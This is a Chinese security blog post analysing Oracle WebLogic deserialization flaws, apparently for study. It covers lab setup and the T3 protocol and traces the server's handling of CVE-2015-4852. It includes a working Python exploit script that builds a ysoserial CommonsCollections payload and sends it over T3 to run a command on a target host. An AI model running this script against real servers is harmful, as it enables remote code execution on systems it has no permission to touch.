<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="WeblogicWebLogic是Oracle公司开发的领先企业级Java应用服务器，全面支持Java EE规范，涵盖EJB、JPA、JMS、JNDI等核心组件。它提供了高可用性、安全性和可扩展性的特性，包括集群、负载均衡、故障转移、用户身份验证、SSL&#x2F;TLS加密等，确保应用程序在高并发和大规模环境下的稳定运行。WebLogic还具备强大的管理和监控功能，如WebLogic Admin">
<meta property="og:type" content="article">
<meta property="og:title" content="Weblogic系列">
<meta property="og:url" content="http://example.com/2024/09/08/Weblogic/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="WeblogicWebLogic是Oracle公司开发的领先企业级Java应用服务器，全面支持Java EE规范，涵盖EJB、JPA、JMS、JNDI等核心组件。它提供了高可用性、安全性和可扩展性的特性，包括集群、负载均衡、故障转移、用户身份验证、SSL&#x2F;TLS加密等，确保应用程序在高并发和大规模环境下的稳定运行。WebLogic还具备强大的管理和监控功能，如WebLogic Admin">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/image-20240908232508526.png">
<meta property="og:image" content="http://example.com/images/image-20240908232357377.png">
<meta property="og:image" content="http://example.com/images/image-20240908233051861.png">
<meta property="og:image" content="http://example.com/images/ecbf31b310fd16dbe29729eb7e9f76b8b96f4cd8.jpg">
<meta property="og:image" content="http://example.com/images/image-20240908234937203.png">
<meta property="og:image" content="http://example.com/images/image-20240909020056074.png">
<meta property="og:image" content="http://example.com/images/image-20240909014933444.png">
<meta property="og:image" content="http://example.com/images/image-20240909020920527.png">
<meta property="og:image" content="http://example.com/images/image-20240909021101863.png">
<meta property="og:image" content="http://example.com/images/image-20240909021610029.png">
<meta property="og:image" content="http://example.com/images/image-20240909022257269.png">
<meta property="og:image" content="http://example.com/images/image-20240909023745466.png">
<meta property="og:image" content="http://example.com/images/image-20240909024147147.png">
<meta property="og:image" content="http://example.com/images/image-20240909030727153.png">
<meta property="og:image" content="http://example.com/images/image-20240909033150565.png">
<meta property="og:image" content="http://example.com/images/image-20240909032035019.png">
<meta property="og:image" content="http://example.com/images/image-20240909032124262.png">
<meta property="og:image" content="http://example.com/images/image-20240909033210511.png">
<meta property="og:image" content="http://example.com/images/image-20240909033512760.png">
<meta property="og:image" content="http://example.com/images/BlackList.png">
<meta property="og:image" content="http://example.com/2024/09/08/Weblogic/images/image-20240910001404857.png">
<meta property="og:image" content="http://example.com/2024/09/08/Weblogic/images/image-20240910010438656.png">
<meta property="og:image" content="http://example.com/images/image-20240911104226797.png">
<meta property="og:image" content="http://example.com/images/image-20240912023839928.png">
<meta property="og:image" content="http://example.com/images/image-20240912034654905.png">
<meta property="og:image" content="http://example.com/images/image-20240912233738340.png">
<meta property="og:image" content="http://example.com/images/image-20240912235146168.png">
<meta property="og:image" content="http://example.com/images/image-20240914145537449.png">
<meta property="og:image" content="http://example.com/images/image-20240915011547329.png">
<meta property="og:image" content="http://example.com/images/image-20240915013453656.png">
<meta property="og:image" content="http://example.com/images/image-20240915015959451.png">
<meta property="og:image" content="http://example.com/images/image-20240915020449544.png">
<meta property="og:image" content="http://example.com/images/image-20240915021252447.png">
<meta property="og:image" content="http://example.com/images/image-20240915022335176.png">
<meta property="og:image" content="http://example.com/images/image-20240915023513509.png">
<meta property="og:image" content="http://example.com/images/image-20240915031202135.png">
<meta property="og:image" content="http://example.com/images/image-20240915032454360.png">
<meta property="og:image" content="http://example.com/images/image-20240915034341315.png">
<meta property="og:image" content="http://example.com/images/image-20240915034710733.png">
<meta property="og:image" content="http://example.com/images/image-20240915035830886.png">
<meta property="og:image" content="http://example.com/images/image-20240915040156452.png">
<meta property="og:image" content="http://example.com/images/image-20240915041157771.png">
<meta property="og:image" content="http://example.com/images/image-20240915041450037.png">
<meta property="og:image" content="http://example.com/images/image-20240915041556373.png">
<meta property="article:published_time" content="2024-09-07T16:00:00.000Z">
<meta property="article:modified_time" content="2024-09-14T20:20:44.318Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/image-20240908232508526.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Weblogic系列</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/09/25/ASM%E5%AD%97%E8%8A%82%E7%A0%81%E7%BC%96%E8%BE%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/08/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/08/Weblogic/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/08/Weblogic/&text=Weblogic系列"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/08/Weblogic/&is_video=false&description=Weblogic系列"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Weblogic系列&body=Check out this article: http://example.com/2024/09/08/Weblogic/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/08/Weblogic/&title=Weblogic系列"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/08/Weblogic/&name=Weblogic系列&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/08/Weblogic/&t=Weblogic系列"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Weblogic"><span class="toc-number">1.</span> <span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#T3%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3"><span class="toc-number">1.2.</span> <span class="toc-text">T3协议相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">1.2.1.</span> <span class="toc-text">CVE-2015-4852</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">第一次交互</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BA%A4%E4%BA%92"><span class="toc-number">1.2.1.2.2.</span> <span class="toc-text">第二次交互</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLDecoder%E7%9B%B8%E5%85%B3"><span class="toc-number">1.3.</span> <span class="toc-text">XMLDecoder相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLEncoder-%E5%92%8C-XMLDecoder"><span class="toc-number">1.3.1.</span> <span class="toc-text">XMLEncoder 和 XMLDecoder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLEncoder"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">XMLEncoder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XMLDecoder"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">XMLDecoder</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-XML-%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7"><span class="toc-number">1.3.2.</span> <span class="toc-text">常见的 XML 标签和属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-XML-%E5%A3%B0%E6%98%8E"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">1. XML 声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%A0%B9%E5%85%83%E7%B4%A0"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">2. 根元素 &lt;java&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%AF%B9%E8%B1%A1%E5%85%83%E7%B4%A0"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">3. 对象元素 &lt;object&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">4. 属性设置 &lt;void&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">5. 基本数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%95%B0%E7%BB%84%E5%92%8C%E9%9B%86%E5%90%88"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">6. 数组和集合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.2.7.</span> <span class="toc-text">7. 方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-Null-%E5%80%BC"><span class="toc-number">1.3.2.8.</span> <span class="toc-text">8. Null 值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLDecoder%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%EF%BC%88%E5%8F%AF%E4%B8%8D%E7%9C%8B%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">XMLDecoder解析流程分析（可不看）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBDemo"><span class="toc-number">1.3.4.</span> <span class="toc-text">攻击Demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-3506-CVE-2017-10271"><span class="toc-number">1.3.5.</span> <span class="toc-text">CVE-2017-3506&amp;CVE-2017-10271</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">漏洞原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">漏洞环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Epayload"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">漏洞payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">1.3.5.5.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Weblogic系列
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-09-07T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-09-08</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><p>WebLogic是Oracle公司开发的领先企业级Java应用服务器，全面支持Java EE规范，涵盖EJB、JPA、JMS、JNDI等核心组件。它提供了高可用性、安全性和可扩展性的特性，包括集群、负载均衡、故障转移、用户身份验证、SSL&#x2F;TLS加密等，确保应用程序在高并发和大规模环境下的稳定运行。WebLogic还具备强大的管理和监控功能，如WebLogic Admin Console和WLST脚本工具，同时支持与Oracle数据库、Oracle Coherence等进行无缝集成，简化了开发、调试和部署过程，为企业级应用提供一个强大的平台。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>参考了<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">CVE-2015-4852 WebLogic T3 反序列化分析 | Drunkbaby’s Blog (drun1baby.top)</a></p>
<p>使用奇安信 A-team 的脚本</p>
<p>脚本链接：<a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p>
<p>下载对应版本的 JDK 和 Weblogic 然后分别放在 jdks 和 weblogics 中</p>
<p>JDK安装包下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a></p>
<p>Weblogic安装包下载地址：<a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></p>
<p>由于CentOS Linux 8已于 2021年12月31日停止更新和维护，由于CentOS 团队从官方镜像中移除CentOS 8的所有包，所以在使用yum源安装或更新会报误。我们要修改Dockerfile文件修改一句代码</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum -y install libnsl</span></span><br><span class="line"></span><br><span class="line">修改成如下</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&#x27;s|^mirrorlist=|#mirrorlist=|g&#x27;</span> /etc/yum.repos.d/CentOS-* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sed -i <span class="string">&#x27;s|^#baseurl=http://mirror.centos.org|baseurl=http://mirrors.aliyun.com|g&#x27;</span> /etc/yum.repos.d/CentOS-* &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    yum -y install libnsl</span></span><br></pre></td></tr></table></figure>

<p>修改之后运行就不会报错了，也可以用vulhub的环境。</p>
<p>获得wlserver_10.3压缩包(由于当时环境搭建失败，又换了一次vulhub搭建，所以我的wlserver_10.3是从vulhub中搭建的环境下载的)</p>
<p>然后把wlserver_10.3文件取到另一个机子上(我weblogic环境在kali上，那么要把该文件夹取到物理机windows上)，把wlserver_10.3&#x2F;server&#x2F;lib文件夹添加到库里</p>
<p><img src="/./images/image-20240908232508526.png" alt="image-20240908232508526"></p>
<p>在idea配置远程调试环境。</p>
<p><img src="/./images/image-20240908232357377.png" alt="image-20240908232357377"></p>
<h2 id="T3协议相关"><a href="#T3协议相关" class="headerlink" title="T3协议相关"></a>T3协议相关</h2><h3 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h3><p>用CVE-2015-4852来学习T3协议的反序列化漏洞。</p>
<p>先附上攻击脚本，CommonsCollections是weblogic的基础包，可以选择cc链反序列化攻击。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;./ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 10.3.1\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;192.168.147.131&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line"></span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>

<p>用wireshark抓取整个攻击过程的流量包</p>
<p><img src="/./images/image-20240908233051861.png" alt="image-20240908233051861"></p>
<blockquote>
<p>T3协议是weblogic用于通信的协议，类似于RMI的JRMP，JRMP协议是rmi默认使用的协议，而T3协议是weblogic独有的协议，weblogic对RMI规范的实现使用了T3协议（rmi默认使用 JRMP协议）。T3协议被优化用于高性能的应用场景，特别是在大量并发连接和高负载的环境下。它通过减少网络开销和提高数据传输效率来提升整体性能。</p>
<p>T3协议结构分为分为请求头和请求体。</p>
</blockquote>
<p>请求头就是第一个红色数据包，然后服务器会返回一些信息，其中包括了weblogic的版本。</p>
<p>而攻击的主体部分请求体，其数据包大致分为如下结构。图片来自<a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/web-13470.html">z_zz_zzz文章</a></p>
<p><img src="/./images/ecbf31b310fd16dbe29729eb7e9f76b8b96f4cd8.jpg" alt="pic"></p>
<p>可以看到wireshark的攻击数据流确实是这样。</p>
<p><img src="/./images/image-20240908234937203.png" alt="image-20240908234937203"></p>
<h4 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><p>Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.2 and 12.2.1.3</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从数据包的两次发送分别来看</p>
<h5 id="第一次交互"><a href="#第一次交互" class="headerlink" title="第一次交互"></a>第一次交互</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">发送数据</span><br><span class="line">t3 10.3.1</span><br><span class="line">AS:255</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br><span class="line"></span><br><span class="line">接收数据</span><br><span class="line">HELO:10.3.6.0.false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br></pre></td></tr></table></figure>

<p><img src="/./images/image-20240909020056074.png" alt="image-20240909020056074"></p>
<p><code>SocketMuxer#readReadySocketOnce</code>中会调用<code>MuxableSocketDiscriminator#isMessageComplete</code>方法，遍历handlers，根据请求头来判断用哪一种协议的处理器handler。一共支持五种协议<code>IIOP</code>、<code>T3</code>、<code>LDAP</code>、<code>SNMP</code>、<code>HTTP</code>，这里自然识别的是T3协议。因此把T3协议的处理器handler的索引赋值给<code>claimedIndex</code>。</p>
<p><img src="/./images/image-20240909014933444.png" alt="image-20240909014933444"></p>
<p>然后进入<code>MuxableSocketDiscriminator#dispatch</code>，首先就是获取当前协议，然后用<code>maybeFilter()</code>方法过滤一下，然后根据当前的 <code>claimedIndex</code>，从 <code>handlers</code> 数组中获取对应的处理器，并调用 <code>createSocket()</code> 方法创建 <code>MuxableSocket</code> 对象。</p>
<p><img src="/./images/image-20240909020920527.png" alt="image-20240909020920527"></p>
<p>然后判断消息是否发送完成，如果消息已经完整，则调用 <code>dispatch()</code> 方法进行分发。这是已经根据上面t3处理器得到处理t3协议<code>MuxableSocket</code> </p>
<p><img src="/./images/image-20240909021101863.png" alt="image-20240909021101863"></p>
<p>一路跟到<code>MuxableSocketT3#dispatch</code>中，这段代码的核心逻辑是通过 <code>bootstrapped</code> 标志来区分处理引导消息和正常消息的过程。首次调用时会进行引导消息的处理，之后的调用则直接将消息传递给连接对象。那么我们的请求头是属于引导消息，进入if之后，会读取引导信息，然后设置<code>bootstrapped</code>属性为true，下一次发送的消息就是进入else继续<code>dispatch</code>分发处理。</p>
<p><img src="/./images/image-20240909021610029.png" alt="image-20240909021610029"></p>
